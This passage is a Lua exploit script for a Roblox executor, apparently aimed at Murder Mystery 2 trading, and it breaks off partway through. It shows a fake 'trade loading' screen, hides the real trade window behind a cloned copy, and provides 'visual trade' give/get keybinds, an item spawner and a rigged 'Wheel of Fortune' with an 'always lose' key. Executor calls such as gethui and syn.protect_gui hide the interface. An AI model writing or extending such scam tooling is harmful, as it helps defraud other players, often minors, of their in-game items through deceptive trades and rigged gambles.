-- ===== MINIMAL FAKE TRADE LOADING SYSTEM =====
local fakeTradeGui = Instance.new("ScreenGui")
fakeTradeGui.Name = "FakeTradeLoad"
fakeTradeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
fakeTradeGui.ResetOnSpawn = false
pcall(function()
    if syn and syn.protect_gui then syn.protect_gui(fakeTradeGui) end
    if gethui then fakeTradeGui.Parent = gethui() else fakeTradeGui.Parent = CoreGui end
end)
if not fakeTradeGui.Parent then fakeTradeGui.Parent = playerGui end

-- Main container
local mainFrame = Instance.new("Frame", fakeTradeGui)
mainFrame.Size = UDim2.new(0, 400, 0, 200)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
local corner = Instance.new("UICorner", mainFrame)
corner.CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", mainFrame)
stroke.Color = Color3.fromRGB(60, 60, 80)
stroke.Thickness = 2

-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -20, 0, 35)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⏳ Loading assets..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.FontFace = Font.new("rbxassetid://16658221428", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
title.TextXAlignment = Enum.TextXAlignment.Left
local ts = Instance.new("UIStroke", title)
ts.Color = Color3.fromRGB(0, 0, 0)
ts.Thickness = 2

-- Progress bar background
local progressBg = Instance.new("Frame", mainFrame)
progressBg.Size = UDim2.new(0.9, 0, 0, 14)
progressBg.Position = UDim2.new(0.05, 0, 0.45, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
progressBg.BorderSizePixel = 0
local pCorner = Instance.new("UICorner", progressBg)
pCorner.CornerRadius = UDim.new(0, 7)

-- Progress bar
local progressBar = Instance.new("Frame", progressBg)
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
progressBar.BorderSizePixel = 0
local barCorner = Instance.new("UICorner", progressBar)
barCorner.CornerRadius = UDim.new(0, 7)

-- Percentage label
local percentLabel = Instance.new("TextLabel", mainFrame)
percentLabel.Size = UDim2.new(0, 60, 0, 25)
percentLabel.Position = UDim2.new(0.9, -65, 0.45, -5)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(200, 220, 255)
percentLabel.TextScaled = true
percentLabel.FontFace = Font.new("rbxassetid://16658221428", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
percentLabel.TextXAlignment = Enum.TextXAlignment.Right

-- Status text
local statusText = Instance.new("TextLabel", mainFrame)
statusText.Size = UDim2.new(0.9, 0, 0, 25)
statusText.Position = UDim2.new(0.05, 0, 0.65, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(180, 180, 200)
statusText.TextScaled = true
statusText.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
statusText.TextXAlignment = Enum.TextXAlignment.Center

-- Status messages
local statusMessages = {
    "Connecting to server...",
    "Fetching inventory...",
    "Loading database...",
    "Verifying slots...",
    "Preparing UI...",
    "Syncing remote...",
    "Loading assets...",
    "Finalizing setup...",
    "Trade ready!",
}

-- Main animation
local totalSteps = 80
local stepTime = 0.25
local currentStep = 0

local function animateLoading()
    while currentStep < totalSteps do
        currentStep = currentStep + 1
        local progress = currentStep / totalSteps
        
        -- Update progress bar
 progressBar:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.2, true)
        percentLabel.Text = math.floor(progress * 100) .. "%"
        
        -- Update status text

	
if currentStep % 3 == 0 then
            local msgIndex = (currentStep // 3) % #statusMessages + 1
            statusText.Text = statusMessages[msgIndex]
        end
        
task.wait(stepTime)
    end
    
    -- Completion
statusText.Text = "✅ Ready!"
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    progressBar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.3, true)
    percentLabel.Text = "100%"
    
task.wait(0.5)
    fakeTradeGui:Destroy()
end

task.spawn(animateLoading)

--Force close after 20 seconds


task.delay(20.5, function()
    if fakeTradeGui and fakeTradeGui.Parent then
        fakeTradeGui:Destroy()
    end
end)
local env = (getgenv and getgenv()) or _G
if env.ChoppedYooEy_Executed then
	local core = game:GetService("CoreGui")
	local plrs = game:GetService("Players")
	local pg = plrs.LocalPlayer and plrs.LocalPlayer:FindFirstChild("PlayerGui")
	local existingGui
	pcall(function() if gethui then existingGui = gethui():FindFirstChild("ChoppedYooEy") end end)
	existingGui = existingGui or core:FindFirstChild("ChoppedYooEy") or (pg and pg:FindFirstChild("ChoppedYooEy"))
	if existingGui and existingGui:FindFirstChild("Main") then
		existingGui.Main.Visible = true
	end
	return
end
env.ChoppedYooEy_Executed = true

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local clonedTradeGUI = nil
local realTradeHidden = false
local autoTraderActive = false
local savedOriginalPositions = {}
local positionsSaved = false

local function saveOriginalPositions()
	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
	if not tradeGUI then return end
	for _, child in ipairs(tradeGUI:GetChildren()) do
		if child:IsA("GuiObject") then
			if child.Position.X.Offset < 50000 and child.Position.Y.Offset < 50000 then
				savedOriginalPositions[child.Name] = child.Position
				positionsSaved = true
			end
		end
	end
end

local function hideRealTradeGUI()
	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
	if not tradeGUI then return end
	realTradeHidden = true
	for _, child in ipairs(tradeGUI:GetChildren()) do
		if child:IsA("GuiObject") then
			pcall(function()
				if not savedOriginalPositions[child.Name] then
					savedOriginalPositions[child.Name] = child.Position
				end
				child.Position = UDim2.new(0, 100000, 0, 100000)
			end)
		end
	end
end

local function restoreClonePositions()
	if not clonedTradeGUI then return end
	for _, child in ipairs(clonedTradeGUI:GetChildren()) do
		if child:IsA("GuiObject") then
			pcall(function()
				if savedOriginalPositions[child.Name] then
					child.Position = savedOriginalPositions[child.Name]
				elseif child.Position.X.Offset >= 50000 or child.Position.Y.Offset >= 50000 then
					child.Position = UDim2.new(0.5, 0, 0.5, 0)
				end
			end)
		end
	end
end

local function setupCloneBeforeHide()
	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
	if not tradeGUI then return nil end
	if clonedTradeGUI and clonedTradeGUI.Parent then
		clonedTradeGUI:Destroy()
		clonedTradeGUI = nil
	end
	saveOriginalPositions()
	clonedTradeGUI = tradeGUI:Clone()
	clonedTradeGUI.Name = "TradeGUI_Clone"
	clonedTradeGUI.Parent = playerGui
	clonedTradeGUI.Enabled = false
	hideRealTradeGUI()
	restoreClonePositions()
	return clonedTradeGUI
end

local function restoreRealTradeGUI()
	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
	if tradeGUI then
		for _, child in ipairs(tradeGUI:GetChildren()) do
			if child:IsA("GuiObject") and savedOriginalPositions[child.Name] then
				pcall(function() child.Position = savedOriginalPositions[child.Name] end)
			end
		end
	end
	realTradeHidden = false
	positionsSaved = false
	savedOriginalPositions = {}
end

local function destroyClone()
	if clonedTradeGUI and clonedTradeGUI.Parent then
		clonedTradeGUI:Destroy()
		clonedTradeGUI = nil
	end
	if not autoTraderActive then restoreRealTradeGUI() end
end

local function getExecutorNameDisplay()
	local name = "Unknown"
	pcall(function()
		if identifyexecutor then name = identifyexecutor()
		elseif getexecutorname then name = getexecutorname()
		elseif exploitname then name = exploitname end
	end)
	return tostring(name)
end

local WEAPON_MESH_DATABASE = {
	{
		Name = "GhostK2018",
		Tool = "GhostK2018",
		MeshId = "rbxassetid://121944778",
		TextureId = "rbxassetid://2514800940",
		Size = Vector3.new(0.4, 3, 0.7),
	},
}

local MM2 = {
	MainBG = Color3.fromRGB(0, 0, 0),
	MainBGTransparency = 0.2,
	TitleBar = Color3.fromRGB(48, 48, 48),
	TabsBG = Color3.fromRGB(25, 25, 25),
	TabInactive = Color3.fromRGB(55, 55, 55),
	TabActive = Color3.fromRGB(85, 85, 85),
	TabStroke = Color3.fromRGB(85, 85, 85),
	ItemBG = Color3.fromRGB(28, 28, 28),
	ItemInner = Color3.fromRGB(13, 12, 14),
	ItemInnerStroke = Color3.fromRGB(45, 45, 45),
	TextWhite = Color3.fromRGB(255, 255, 255),
	SearchBG = Color3.fromRGB(32, 32, 32),
	SearchStroke = Color3.fromRGB(65, 65, 78),
	CloseRed = Color3.fromRGB(178, 62, 64),
	CloseRedStroke = Color3.fromRGB(122, 43, 45),
	ActionBlue = Color3.fromRGB(61, 137, 178),
	ActionBlueStroke = Color3.fromRGB(42, 91, 122),
	InfoBlue = Color3.fromRGB(50, 122, 178),
	InfoBlueStroke = Color3.fromRGB(33, 80, 116),
	GreenAction = Color3.fromRGB(60, 165, 90),
	GreenActionStroke = Color3.fromRGB(40, 110, 60),
	FontBold = Font.new("rbxassetid://16658221428", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal),
	FontFred = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal),
	FontFredBold = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
}

local Utils = {}

function Utils.corner(parent, r)
	local c = Instance.new("UICorner", parent)
	c.CornerRadius = UDim.new(0, r or 6)
	return c
end

function Utils.stroke(parent, color, thickness, transparency)
	local s = Instance.new("UIStroke", parent)
	s.Color = color or Color3.fromRGB(0, 0, 0)
	s.Thickness = thickness or 3
	s.Transparency = transparency or 0
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	return s
end

function Utils.textStroke(parent, thickness)
	local s = Instance.new("UIStroke", parent)
	s.Color = Color3.fromRGB(0, 0, 0)
	s.Thickness = thickness or 2
	return s
end

function Utils.makeMM2Button(text, parent, size, position, bgColor, strokeColor)
	local btn = Instance.new("Frame", parent)
	btn.BorderSizePixel = 0
	btn.BackgroundColor3 = bgColor or MM2.ItemBG
	btn.Size = size
	btn.Position = position
	Utils.corner(btn, 6)
	Utils.stroke(btn, strokeColor or MM2.TabStroke, 3)
	local click = Instance.new("ImageButton", btn)
	click.BorderSizePixel = 0
	click.BackgroundTransparency = 1
	click.Size = UDim2.new(1, 0, 1, 0)
	click.Name = "Button"
	click.ZIndex = 5
	local lbl = Instance.new("TextLabel", btn)
	lbl.BackgroundTransparency = 1
	lbl.Size = UDim2.new(1, -10, 1, -6)
	lbl.Position = UDim2.new(0, 5, 0, 3)
	lbl.Text = text
	lbl.TextColor3 = MM2.TextWhite
	lbl.TextScaled = true
	lbl.FontFace = MM2.FontBold
	lbl.TextWrapped = true
	Utils.textStroke(lbl, 2)
	return btn, click, lbl
end

function Utils.makeDraggable(dragHandle, moveFrame)
	moveFrame = moveFrame or dragHandle
	local dragToggle, dragStart, startPos
	dragHandle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragToggle = true
			dragStart = input.Position
			startPos = moveFrame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragToggle then
			local delta = input.Position - dragStart
			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			TweenService:Create(moveFrame, TweenInfo.new(0.1), {Position = position}):Play()
		end
	end)
end

local isDelta = false
pcall(function()
	local en = getExecutorName():lower()
	if en:find("delta") then isDelta = true end
end)

local UI = {}

do
	local screen = Instance.new("ScreenGui")
	screen.Name = "ChoppedYooEy"
	screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screen.ResetOnSpawn = false
	pcall(function()
		if syn and syn.protect_gui then syn.protect_gui(screen) end
		if gethui then screen.Parent = gethui() else screen.Parent = CoreGui end
	end)
	if not screen.Parent then
		local ok = pcall(function() screen.Parent = CoreGui end)
		if not ok then screen.Parent = playerGui end
	end
	UI.screen = screen

	local main = Instance.new("Frame", screen)
	main.Name = "Main"
	main.BorderSizePixel = 0
	main.BackgroundColor3 = MM2.MainBG
	main.BackgroundTransparency = MM2.MainBGTransparency
	main.AnchorPoint = Vector2.new(0.5, 0.5)
	main.Size = UDim2.new(0, 750, 0, 500)
	main.Position = UDim2.new(0.5, 0, 0.5, 0)
	main.Active = true
	Utils.corner(main, 6)
	UI.main = main

	local titleBar = Instance.new("Frame", main)
	titleBar.Name = "Title"
	titleBar.BorderSizePixel = 0
	titleBar.BackgroundColor3 = MM2.TitleBar
	titleBar.Size = UDim2.new(1, 0, 0, 55)
	Utils.corner(titleBar, 6)
	local tp = Instance.new("UIPadding", titleBar)
	tp.PaddingTop = UDim.new(0, 5)
	tp.PaddingRight = UDim.new(0, 5)
	tp.PaddingLeft = UDim.new(0, 10)
	tp.PaddingBottom = UDim.new(0, 5)

	local titleLabel = Instance.new("TextLabel", titleBar)
	titleLabel.BorderSizePixel = 0
	titleLabel.BackgroundTransparency = 1
	titleLabel.Size = UDim2.new(1, 0, 1, 0)
	titleLabel.Text = "Visual Studio"
	titleLabel.TextColor3 = MM2.TextWhite
	titleLabel.TextScaled = true
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.FontFace = MM2.FontBold
	Utils.textStroke(titleLabel, 2.7)

	local closeFrame = Instance.new("Frame", titleBar)
	closeFrame.BorderSizePixel = 0
	closeFrame.BackgroundColor3 = MM2.CloseRed
	closeFrame.AnchorPoint = Vector2.new(1, 0.5)
	closeFrame.Size = UDim2.new(0, 45, 1, -5)
	closeFrame.Position = UDim2.new(1, -5, 0.5, 0)
	Utils.corner(closeFrame, 3)
	Utils.stroke(closeFrame, MM2.CloseRedStroke, 3)
	local closeBtn = Instance.new("ImageButton", closeFrame)
	closeBtn.BorderSizePixel = 0
	closeBtn.BackgroundTransparency = 1
	closeBtn.Size = UDim2.new(1, 0, 1, 0)
	closeBtn.ZIndex = 5
	local closeText = Instance.new("TextLabel", closeFrame)
	closeText.BorderSizePixel = 0
	closeText.BackgroundTransparency = 1
	closeText.AnchorPoint = Vector2.new(0.5, 0.5)
	closeText.Size = UDim2.new(0.8, 0, 0.8, 0)
	closeText.Position = UDim2.new(0.5, 0, 0.5, 0)
	closeText.Text = "X"
	closeText.TextColor3 = MM2.TextWhite
	closeText.TextScaled = true
	closeText.FontFace = MM2.FontFredBold
	Utils.textStroke(closeText, 2)
	closeBtn.MouseButton1Click:Connect(function() main.Visible = false end)

	local contents = Instance.new("Frame", main)
	contents.BorderSizePixel = 0
	contents.BackgroundTransparency = 1
	contents.Size = UDim2.new(1, 0, 1, -55)
	contents.Position = UDim2.new(0, 0, 0, 55)
	local cp = Instance.new("UIPadding", contents)
	cp.PaddingTop = UDim.new(0, 6)
	cp.PaddingRight = UDim.new(0, 6)
	cp.PaddingLeft = UDim.new(0, 6)
	cp.PaddingBottom = UDim.new(0, 6)

	local tabsBar = Instance.new("Frame", contents)
	tabsBar.BorderSizePixel = 0
	tabsBar.BackgroundColor3 = MM2.TabsBG
	tabsBar.AnchorPoint = Vector2.new(1, 0)
	tabsBar.Size = UDim2.new(0.18, 0, 1, 0)
	tabsBar.Position = UDim2.new(1, 0, 0, 0)
	Utils.corner(tabsBar, 6)
	local tbp = Instance.new("UIPadding", tabsBar)
	tbp.PaddingTop = UDim.new(0, 6)
	tbp.PaddingRight = UDim.new(0, 6)
	tbp.PaddingLeft = UDim.new(0, 6)
	tbp.PaddingBottom = UDim.new(0, 6)
	local tl = Instance.new("UIListLayout", tabsBar)
	tl.HorizontalAlignment = Enum.HorizontalAlignment.Center
	tl.Padding = UDim.new(0, 8)
	tl.SortOrder = Enum.SortOrder.LayoutOrder

	local function makeTab(name, layoutOrder)
		local tab = Instance.new("Frame", tabsBar)
		tab.BorderSizePixel = 0
		tab.BackgroundColor3 = MM2.TabInactive
		tab.Size = UDim2.new(1, 0, 0, 60)
		tab.LayoutOrder = layoutOrder
		Utils.corner(tab, 3)
		Utils.stroke(tab, MM2.TabStroke, 3)
		local btn = Instance.new("ImageButton", tab)
		btn.BorderSizePixel = 0
		btn.BackgroundTransparency = 1
		btn.Size = UDim2.new(1, 0, 1, 0)
		btn.ZIndex = 30
		local lbl = Instance.new("TextLabel", tab)
		lbl.BorderSizePixel = 0
		lbl.BackgroundTransparency = 1
		lbl.Size = UDim2.new(1, -10, 1, -10)
		lbl.Position = UDim2.new(0, 5, 0, 5)
		lbl.Text = name
		lbl.TextColor3 = MM2.TextWhite
		lbl.TextScaled = true
		lbl.FontFace = MM2.FontBold
		Utils.textStroke(lbl, 1.9)
		return tab, btn
	end

	UI.tab1, UI.tab1Btn = makeTab("Spawner", 1)
	UI.tab2, UI.tab2Btn = makeTab("Methods", 2)
	UI.tab3, UI.tab3Btn = makeTab("Settings", 3)

	local mainArea = Instance.new("Frame", contents)
	mainArea.BorderSizePixel = 0
	mainArea.BackgroundTransparency = 1
	mainArea.Size = UDim2.new(0.815, -6, 1, 0)
	UI.mainArea = mainArea

	local spawnerPage = Instance.new("Frame", mainArea)
	spawnerPage.BorderSizePixel = 0
	spawnerPage.BackgroundTransparency = 1
	spawnerPage.Size = UDim2.new(1, 0, 1, 0)
	UI.spawnerPage = spawnerPage

	local searchBox = Instance.new("TextBox", spawnerPage)
	searchBox.BorderSizePixel = 0
	searchBox.BackgroundColor3 = MM2.SearchBG
	searchBox.Size = UDim2.new(1, 0, 0, 32)
	searchBox.PlaceholderText = "Search for item.."
	searchBox.PlaceholderColor3 = Color3.fromRGB(179, 179, 179)
	searchBox.Text = ""
	searchBox.TextColor3 = MM2.TextWhite
	searchBox.TextSize = 16
	searchBox.FontFace = MM2.FontFred
	Utils.corner(searchBox, 3)
	Utils.stroke(searchBox, MM2.SearchStroke, 3)
	UI.searchBox = searchBox

	local itemGrid = Instance.new("ScrollingFrame", spawnerPage)
	itemGrid.ScrollingDirection = Enum.ScrollingDirection.Y
	itemGrid.BorderSizePixel = 0
	itemGrid.BackgroundTransparency = 1
	itemGrid.CanvasSize = UDim2.new(0, 0, 0, 0)
	itemGrid.AutomaticCanvasSize = Enum.AutomaticSize.Y
	itemGrid.Size = UDim2.new(1, 0, 1, -38)
	itemGrid.Position = UDim2.new(0, 0, 0, 38)
	itemGrid.ScrollBarThickness = 10
	UI.itemGrid = itemGrid

	local gl = Instance.new("UIGridLayout", itemGrid)
	gl.CellSize = UDim2.new(0, 105, 0, 135)
	gl.CellPadding = UDim2.new(0, 8, 0, 8)
	gl.SortOrder = Enum.SortOrder.LayoutOrder

	local itemTemplate = Instance.new("ImageButton", itemGrid)
	itemTemplate.Name = "Template"
	itemTemplate.Active = false
	itemTemplate.BorderSizePixel = 0
	itemTemplate.BackgroundTransparency = 1
	itemTemplate.Size = UDim2.new(0, 105, 0, 135)
	itemTemplate.Visible = false
	local td = Instance.new("Frame", itemTemplate)
	td.Name = "Default"
	td.BorderSizePixel = 0
	td.BackgroundColor3 = MM2.ItemBG
	td.AnchorPoint = Vector2.new(0.5, 0.5)
	td.Size = UDim2.new(1, 0, 1, 0)
	td.Position = UDim2.new(0.5, 0, 0.5, 0)
	Utils.corner(td, 10)
	local ds = Instance.new("UIStroke", td)
	ds.Transparency = 0.35
	ds.Thickness = 3
	local ti = Instance.new("Frame", td)
	ti.BorderSizePixel = 0
	ti.BackgroundColor3 = MM2.ItemInner
	ti.AnchorPoint = Vector2.new(0.5, 0.5)
	ti.Size = UDim2.new(0.887, 0, 0.899, 0)
	ti.Position = UDim2.new(0.5, 0, 0.5, 0)
	Utils.corner(ti, 8)
	local tis = Instance.new("UIStroke", ti)
	tis.Thickness = 3
	tis.Color = MM2.ItemInnerStroke
	local tic = Instance.new("ImageLabel", itemTemplate)
	tic.Name = "Icon"
	tic.ScaleType = Enum.ScaleType.Fit
	tic.Image = "rbxassetid://16911678024"
	tic.Size = UDim2.new(1, 0, 0.66, 0)
	tic.BackgroundTransparency = 1
	local tn = Instance.new("TextLabel", itemTemplate)
	tn.Name = "ItemName"
	tn.TextWrapped = true
	tn.TextScaled = true
	tn.FontFace = MM2.FontFred
	tn.TextColor3 = MM2.TextWhite
	tn.BackgroundTransparency = 1
	tn.Size = UDim2.new(0.87, 0, 0.21, 0)
	tn.Text = "???"
	tn.Position = UDim2.new(0.05, 0, 0.73, 0)
	Utils.textStroke(tn, 1.5)
	UI.itemTemplate = itemTemplate

	local methodsPage = Instance.new("Frame", mainArea)
	methodsPage.BorderSizePixel = 0
	methodsPage.BackgroundTransparency = 1
	methodsPage.Size = UDim2.new(1, 0, 1, 0)
	methodsPage.Visible = false
	UI.methodsPage = methodsPage

	local methodsTabBar = Instance.new("Frame", methodsPage)
	methodsTabBar.BorderSizePixel = 0
	methodsTabBar.BackgroundColor3 = MM2.TabsBG
	methodsTabBar.Size = UDim2.new(1, 0, 0, 40)
	Utils.corner(methodsTabBar, 6)
	local mtbp = Instance.new("UIPadding", methodsTabBar)
	mtbp.PaddingTop = UDim.new(0, 4)
	mtbp.PaddingBottom = UDim.new(0, 4)
	mtbp.PaddingLeft = UDim.new(0, 4)
	mtbp.PaddingRight = UDim.new(0, 4)
	local mtl = Instance.new("UIListLayout", methodsTabBar)
	mtl.FillDirection = Enum.FillDirection.Horizontal
	mtl.HorizontalAlignment = Enum.HorizontalAlignment.Center
	mtl.VerticalAlignment = Enum.VerticalAlignment.Center
	mtl.Padding = UDim.new(0, 6)

	local function makeSubTab(name, layoutOrder)
		local t = Instance.new("Frame", methodsTabBar)
		t.BorderSizePixel = 0
		t.BackgroundColor3 = MM2.TabInactive
		t.Size = UDim2.new(0.32, -4, 1, 0)
		t.LayoutOrder = layoutOrder
		Utils.corner(t, 3)
		Utils.stroke(t, MM2.TabStroke, 2)
		local b = Instance.new("ImageButton", t)
		b.BorderSizePixel = 0
		b.BackgroundTransparency = 1
		b.Size = UDim2.new(1, 0, 1, 0)
		b.ZIndex = 30
		local lb = Instance.new("TextLabel", t)
		lb.BorderSizePixel = 0
		lb.BackgroundTransparency = 1
		lb.Size = UDim2.new(1, -8, 1, -4)
		lb.Position = UDim2.new(0, 4, 0, 2)
		lb.Text = name
		lb.TextColor3 = MM2.TextWhite
		lb.TextScaled = true
		lb.FontFace = MM2.FontBold
		Utils.textStroke(lb, 1.5)
		return t, b
	end

	UI.mTabVisuals, UI.mTabVisualsBtn = makeSubTab("Visuals", 1)
	UI.mTabWheel, UI.mTabWheelBtn = makeSubTab("Wheel of Fortune", 2)
	UI.mTabBlocker, UI.mTabBlockerBtn = makeSubTab("Blocker", 3)

	local mSubArea = Instance.new("Frame", methodsPage)
	mSubArea.BorderSizePixel = 0
	mSubArea.BackgroundTransparency = 1
	mSubArea.Size = UDim2.new(1, 0, 1, -48)
	mSubArea.Position = UDim2.new(0, 0, 0, 48)
	UI.mSubArea = mSubArea

	local visualsSub = Instance.new("Frame", mSubArea)
	visualsSub.BorderSizePixel = 0
	visualsSub.BackgroundTransparency = 1
	visualsSub.Size = UDim2.new(1, 0, 1, 0)
	UI.visualsSub = visualsSub

	local vTitle = Instance.new("TextLabel", visualsSub)
	vTitle.BorderSizePixel = 0
	vTitle.BackgroundTransparency = 1
	vTitle.Size = UDim2.new(1, 0, 0, 30)
	vTitle.Position = UDim2.new(0, 0, 0, 5)
	vTitle.Text = "Visual Trade Settings"
	vTitle.TextColor3 = MM2.TextWhite
	vTitle.TextScaled = true
	vTitle.FontFace = MM2.FontBold
	Utils.textStroke(vTitle, 1.8)

	UI.visualBtn, UI.visualClick, UI.visualLbl = Utils.makeMM2Button("Visual Trade: OFF", visualsSub, UDim2.new(0, 260, 0, 50), UDim2.new(0.5, -130, 0, 45), MM2.ItemBG, MM2.TabStroke)

	local kbTitle = Instance.new("TextLabel", visualsSub)
	kbTitle.BorderSizePixel = 0
	kbTitle.BackgroundTransparency = 1
	kbTitle.Size = UDim2.new(1, 0, 0, 22)
	kbTitle.Position = UDim2.new(0, 0, 0, 110)
	kbTitle.Text = isDelta and "Mobile Buttons (drag to move)" or "Trade Keybinds (click then press key)"
	kbTitle.TextColor3 = MM2.TextWhite
	kbTitle.TextScaled = true
	kbTitle.FontFace = MM2.FontFred
	Utils.textStroke(kbTitle, 1.3)

	UI.qGiveBtn, UI.qGiveClick, UI.qGiveLbl = Utils.makeMM2Button("Q to give", visualsSub, UDim2.new(0, 200, 0, 42), UDim2.new(0.1, 0, 0, 140), MM2.ItemBG, MM2.TabStroke)
	UI.tGetBtn, UI.tGetClick, UI.tGetLbl = Utils.makeMM2Button("T to get", visualsSub, UDim2.new(0, 200, 0, 42), UDim2.new(0.55, 0, 0, 140), MM2.ItemBG, MM2.TabStroke)

	if isDelta then
		UI.qGiveBtn.Visible = false
		UI.tGetBtn.Visible = false
	end
	local mqLbl = Instance.new("TextLabel", visualsSub)
	mqLbl.BorderSizePixel = 0
	mqLbl.BackgroundTransparency = 1
	mqLbl.Size = UDim2.new(0, 130, 0, 30)
	mqLbl.Position = UDim2.new(0.05, 0, 1, -70)
	mqLbl.Text = "Max Amount:"
	mqLbl.TextColor3 = MM2.TextWhite
	mqLbl.TextScaled = true
	mqLbl.FontFace = MM2.FontBold
	mqLbl.TextXAlignment = Enum.TextXAlignment.Left
	Utils.textStroke(mqLbl, 1.5)

	local mqBox = Instance.new("TextBox", visualsSub)
	mqBox.BorderSizePixel = 0
	mqBox.BackgroundColor3 = MM2.SearchBG
	mqBox.Size = UDim2.new(0, 100, 0, 30)
	mqBox.Position = UDim2.new(0.05, 130, 1, -70)
	mqBox.Text = "299"
	mqBox.PlaceholderText = "299"
	mqBox.PlaceholderColor3 = Color3.fromRGB(179, 179, 179)
	mqBox.TextColor3 = MM2.TextWhite
	mqBox.TextScaled = true
	mqBox.FontFace = MM2.FontFred
	mqBox.ClearTextOnFocus = false
	Utils.corner(mqBox, 3)
	Utils.stroke(mqBox, MM2.SearchStroke, 2)
	UI.maxQtyBox = mqBox

	UI.giveAllBtn, UI.giveAllClick, UI.giveAllLbl = Utils.makeMM2Button("Give All (Resets)", visualsSub, UDim2.new(0, 200, 0, 50), UDim2.new(1, -220, 1, -80), MM2.GreenAction, MM2.GreenActionStroke)

	local wheelSub = Instance.new("Frame", mSubArea)
	wheelSub.BorderSizePixel = 0
	wheelSub.BackgroundTransparency = 1
	wheelSub.Size = UDim2.new(1, 0, 1, 0)
	wheelSub.Visible = false
	UI.wheelSub = wheelSub

	local wTitle = Instance.new("TextLabel", wheelSub)
	wTitle.BorderSizePixel = 0
	wTitle.BackgroundTransparency = 1
	wTitle.Size = UDim2.new(1, 0, 0, 30)
	wTitle.Position = UDim2.new(0, 0, 0, 5)
	wTitle.Text = "Wheel of Fortune"
	wTitle.TextColor3 = MM2.TextWhite
	wTitle.TextScaled = true
	wTitle.FontFace = MM2.FontBold
	Utils.textStroke(wTitle, 1.8)

	UI.wheelBtn, UI.wheelClick, UI.wheelLbl = Utils.makeMM2Button("Open Wheel", wheelSub, UDim2.new(0, 260, 0, 50), UDim2.new(0.5, -130, 0, 45), MM2.InfoBlue, MM2.InfoBlueStroke)

	local wkbTitle = Instance.new("TextLabel", wheelSub)
	wkbTitle.BorderSizePixel = 0
	wkbTitle.BackgroundTransparency = 1
	wkbTitle.Size = UDim2.new(1, 0, 0, 22)
	wkbTitle.Position = UDim2.new(0, 0, 0, 110)
	wkbTitle.Text = "Spin Keybinds (only work when wheel is open)"
	wkbTitle.TextColor3 = MM2.TextWhite
	wkbTitle.TextScaled = true
	wkbTitle.FontFace = MM2.FontFred
	Utils.textStroke(wkbTitle, 1.3)

	UI.alwaysLoseBtn, UI.alwaysLoseClick, UI.alwaysLoseLbl = Utils.makeMM2Button("X always lose", wheelSub, UDim2.new(0, 240, 0, 45), UDim2.new(0.05, 0, 0, 140), MM2.CloseRed, MM2.CloseRedStroke)
	UI.legit5050Btn, UI.legit5050Click, UI.legit5050Lbl = Utils.makeMM2Button("B legit 50/50", wheelSub, UDim2.new(0, 240, 0, 45), UDim2.new(0.5, 0, 0, 140), MM2.GreenAction, MM2.GreenActionStroke)

	local wDesc = Instance.new("TextLabel", wheelSub)
	wDesc.BorderSizePixel = 0
	wDesc.BackgroundTransparency = 1
	wDesc.Size = UDim2.new(0.9, 0, 0, 60)
	wDesc.Position = UDim2.new(0.05, 0, 0, 210)
	wDesc.Text = "Open the wheel first, then use your keybinds to spin."
	wDesc.TextColor3 = MM2.TextWhite
	wDesc.TextScaled = true
	wDesc.FontFace = MM2.FontFred
	wDesc.TextWrapped = true
	Utils.textStroke(wDesc, 1.3)

	local blockerSub = Instance.new("Frame", mSubArea)
	blockerSub.BorderSizePixel = 0
	blockerSub.BackgroundTransparency = 1
	blockerSub.Size = UDim2.new(1, 0, 1, 0)
	blockerSub.Visible = false
	UI.blockerSub = blockerSub

	local bTitle = Instance.new("TextLabel", blockerSub)
	bTitle.BorderSizePixel = 0
	bTitle.BackgroundTransparency = 1
